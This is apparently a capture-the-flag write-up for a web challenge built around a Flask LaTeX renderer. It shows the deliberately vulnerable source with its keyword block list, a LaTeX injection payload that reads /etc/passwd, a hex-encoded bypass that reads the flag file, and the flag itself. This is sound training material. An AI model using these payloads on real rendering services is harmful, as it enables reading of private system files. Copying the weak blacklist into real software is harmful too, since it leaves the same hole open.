# Kethal's Transmitter

#### Category: Web Exploitation

#### Difficulty: Easy

#### Type: White Box

#### Description: Sending signals over space can take a long time.  Kethal recently built a technology capable of transmitting messages to other galaxies using a specific signal.  If only I could figure out what techniques he uses.

#### Preview:

![image](https://github.com/user-attachments/assets/6c47c66e-d94e-4210-9181-d0e173553ad6)

## Set Up & Installation

Ensure that docker is installed in your virtual machine before the set up process.

#### [1] Download challenge files
Ensure to download the challenge file `Challenge.zip`

#### [2] Build challenge Docker image 
`sudo docker build -t chall .`

#### [3] Run the image inside a container
`sudo docker run -d chall`

#### [4] Get Docker container IP address
`sudo docker inspect <container-id> | grep 'IP'`

#### [5] Access challenge website
Access to `http://docker-ip-address:5000`

## Solution
<details>

The web challenge included Flask source code and a webpage with a text input. We may start by just testing it using the string "Hello World" to see how it responds. It appears that the result just displays whatever text we have entered, but this does not lead to anything. Therefore, we investigate the source code to determine what the website is doing.

![image](https://github.com/user-attachments/assets/c95bf775-d98c-40c8-8eb8-8329154a928e)

### Source Code (Python)
```python
from flask import Flask, render_template, request, jsonify
import subprocess
import os
import uuid
import base64
import time
import shutil

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret_key'
app.config['TEMP_FOLDER'] = 'temp'
app.config['FLAG'] = 'ICTF25{test_flag}'

os.makedirs(app.config['TEMP_FOLDER'], exist_ok=True)

LATEX_TEMPLATE = r"""
\documentclass{{article}}
\usepackage{{amsmath}}
\pagestyle{{empty}}

\begin{{document}}
{}
\end{{document}}
"""

blacklisted = ['flag', '.txt','newread','openin','read','file','line','closein','verbatim','usepackage','verbatiminput','lstinputlisting']

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/render', methods=['POST'])
def render_latex():
    cleanup_old_jobs(app.config['TEMP_FOLDER'])

    latex_code = request.form.get('latex', '')

    for word in blacklisted:
        if word in latex_code.lower():
            return jsonify({'error': 'Forbidden word detected'})

    job_id = str(uuid.uuid4())
    job_dir = os.path.join(app.config['TEMP_FOLDER'], job_id)
    os.makedirs(job_dir, exist_ok=True)

    try:
        flag_path = os.path.join(job_dir, 'flag.txt')
        with open(flag_path, 'w') as f:
            f.write(app.config['FLAG'])  

        full_latex = LATEX_TEMPLATE.format(latex_code)
        tex_file = os.path.join(job_dir, 'document.tex')
        with open(tex_file, 'w') as f:
            f.write(full_latex)

        result = subprocess.run(
            ['pdflatex', '-interaction=nonstopmode', '-output-directory', job_dir, tex_file],
            timeout=5,
            capture_output=True,
            text=True
        )

        if result.returncode != 0:
            return jsonify({
                'error': 'Invalid Function!'
            })

        pdf_file = os.path.join(job_dir, 'document.pdf')
        png_file = os.path.join(job_dir, 'output.png')
        convert_result = subprocess.run(
            ['convert', '-density', '150', pdf_file, '-quality', '90', png_file],
            timeout=5,
            capture_output=True,
            text=True
        )

        if convert_result.returncode != 0:
            return jsonify({'error': 'Image conversion failed'})

        with open(png_file, 'rb') as f:
            image_data = base64.b64encode(f.read()).decode('utf-8')

        response = {'image': image_data}
        return jsonify(response)

    except subprocess.TimeoutExpired:
        return jsonify({'error': 'Compilation Timed Out'})
    except Exception as e:
        return jsonify({'error': 'An error occurred'})
    finally:
        pass


def cleanup_old_jobs(temp_folder, max_age_seconds=60): 
    now = time.time()
    for job_name in os.listdir(temp_folder):
        job_path = os.path.join(temp_folder, job_name)
        if os.path.isdir(job_path):
            try:
                creation_time = os.path.getctime(job_path)
                if now - creation_time > max_age_seconds:
                    shutil.rmtree(job_path)
            except Exception as e:
                print(f"Cleanup error for {job_path}: {e}")


if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
```

According to the source code, the website will POST the LaTeX code to route `/render`, which will then be compiled into a PDF and converted to PNG format. The website additionally generates a `TEMP_FOLDER` with a unique ID for storing the rendered code. The `FLAG` is then stored in each job directory as `flag.txt`, with a blacklisting function to prohibit the user from sending certain LaTeX commands or directly accessing the content of the file `flag.txt`. Based on our observations, we can conclude that this website contains [Latex Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection) vulnerability.

We can start by using a simple Latex Injection payload to read a specific file. For this scenario, we are going to read the contents of `/etc/passwd` to test whether does this payload works.

```
\newread\file
\openin\file=/etc/passwd
\read\file to\line
\text{\line}
\closein\file
```

It seems that the website detected some forbidden words and disallow us to print out the contents of the file that we specified. This is because the payload contains blacklisted strings such as `'newread', 'openin', 'read', 'file', 'line', 'closein', 'verbatim', 'usepackage', 'verbatiminput', 'lstinputlisting'`.

![image](https://github.com/user-attachments/assets/b1fa3b60-e075-4aca-8c5b-aa82e99c9af6)

Upon doing some research, there is a simple approach to bypass blacklisted strings by trying to replace one character with it's unicode hex value. Can refer to [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LaTeX%20Injection/README.md).

![image](https://github.com/user-attachments/assets/cd88bbcf-7b6f-4586-b7d9-b8bb96f9c018)

Encoding the characters to hex should allow us to bypass blacklisted strings. Therefore, we can try use the same payload again and encode some of the characters with its hex value.

![image](https://github.com/user-attachments/assets/1915bb24-8f06-49a1-83b3-e9c322fc7e95)

It seems like the payload works so we can encode the rest of the characters like `flag.txt` to read the content of the file since the filename was also blacklisted. The following payload should look like this:

```
\newr^^65ad\fil^^65
\open^^69n\fil^^65=fl^^61g.t^^78t
\re^^61d\fil^^65 to\lin^^65
\text{\lin^^65}
\close^^69n\fil^^65
```

Using the payload and submitting it into the input will disclose the contents of the file `flag.txt`. Thus, the flag was successfully obtained.

![image](https://github.com/user-attachments/assets/82d48f15-4a35-4436-b332-82c7d361b9da)

### Flag
> ICTF25{dd265d58e3e1941a0cce646df439ea13c931d0159fe5c754cd39c8bad146fea7}

</details>
